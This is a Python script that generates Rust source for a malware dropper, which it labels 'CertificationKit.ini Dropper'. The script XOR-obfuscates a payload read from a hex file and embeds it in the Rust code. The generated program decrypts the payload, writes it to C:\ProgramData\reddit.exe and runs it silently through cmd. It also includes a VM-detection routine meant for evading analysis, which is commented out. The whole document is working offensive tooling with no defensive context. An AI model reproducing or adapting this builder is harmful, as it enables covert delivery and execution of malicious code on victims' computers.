
import binascii

XOR_KEY = 0x15


with open('reddit.hex', 'r') as f:
    hex_data = f.read().strip()


binary_data = binascii.unhexlify(hex_data)


encrypted = bytearray()
for byte in binary_data:
    encrypted.append(byte ^ XOR_KEY)


encrypted_hex = binascii.hexlify(encrypted).decode()
start = """// dropper/src/main.rs
// CertificationKit.ini Dropper

use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::path::Path;

const XOR_KEY: u8 = 0x15;

const TARGET_PATH: &str = r"C:\\ProgramData\\reddit.exe";
"""
end ="""fn decrypt_xor(data: &[u8], key: u8) -> Vec<u8> {
    data.iter().map(|&b| b ^ key).collect()
}

fn write_file(path: &str, data: &[u8]) -> Result<(), String> {
    println!("[*] Writing payload to: {}", path);
    
    if let Some(parent) = Path::new(path).parent() {
        if !parent.exists() {
            println!("[*] Creating directory: {:?}", parent);
            std::fs::create_dir_all(parent)
                .map_err(|e| format!("Failed to create directory: {}", e))?;
        }
    }
    
    let mut file = File::create(path)
        .map_err(|e| format!("Failed to create file: {}", e))?;
    
    file.write_all(data)
        .map_err(|e| format!("Failed to write data: {}", e))?;
    
    println!("[+] File written successfully ({} bytes)", data.len());
    Ok(())
}

fn execute_payload(path: &str) -> Result<(), String> {
    println!("[*] Executing payload: {}", path);
    
    if !Path::new(path).exists() {
        return Err(format!("File not found: {}", path));
    }
    
    let output = Command::new("cmd")
        .args(&["/c", "start", "/b", path])
        .spawn()
        .map_err(|e| format!("Failed to execute: {}", e))?;
    
    println!("[+] Payload executed with PID: {}", output.id());
    Ok(())
}

fn cleanup_old_payload(path: &str) {
    println!("[*] Checking for old payload...");
    if Path::new(path).exists() {
        match std::fs::remove_file(path) {
            Ok(_) => println!("[+] Removed old payload"),
            Err(e) => println!("[!] Failed to remove old payload: {}", e),
        }
    }
}

fn basic_checks() -> bool {
    /*
    println!("[*] Running basic environment checks...");
    
    let vm_files = [
        r"C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        r"C:\\Windows\\System32\\drivers\\vmmouse.sys",
    ];
    
    for &file in &vm_files {
        if Path::new(file).exists() {
            println!("[!] VM detected: {}", file);
            return true;
        }
    }
      */
    false
}

fn main() {
    println!("===================================");
    println!("CertificationKit.ini Dropper v1.0");
    println!("===================================\n");
    
    
    if basic_checks() {
        println!("[!] Analysis environment detected! Exiting...");
        return;
    }
  
    println!("[*] Dropper started...");
    
    cleanup_old_payload(TARGET_PATH);
    
    println!("[*] Decrypting payload (XOR key: 0x{:X})...", XOR_KEY);
    let decrypted = decrypt_xor(ENCRYPTED_PAYLOAD, XOR_KEY);
    println!("[+] Decrypted {} bytes", decrypted.len());
    
    match write_file(TARGET_PATH, &decrypted) {
        Ok(_) => println!("[+] Payload written successfully"),
        Err(e) => {
            eprintln!("[!] Failed to write payload: {}", e);
            return;
        }
    }
    
    match execute_payload(TARGET_PATH) {
        Ok(_) => println!("[+] Payload executed"),
        Err(e) => eprintln!("[!] Failed to execute: {}", e),
    }
    
    println!("[*] Dropper finished.");
}"""


formatted = ''
for i in range(0, len(encrypted_hex), 32):
    line = encrypted_hex[i:i+32]
    formatted += '    ' + ', '.join(f'0x{line[j:j+2]}' for j in range(0, len(line), 2))
    if i + 32 < len(encrypted_hex):
        formatted += ',\n'
    else:
        formatted += ',\n'
print(start)
print(f'// Encrypted payload size: {len(binary_data)} bytes')
print(f'const ENCRYPTED_PAYLOAD: &[u8] = &[')
print(formatted)
print('];')
print(end)

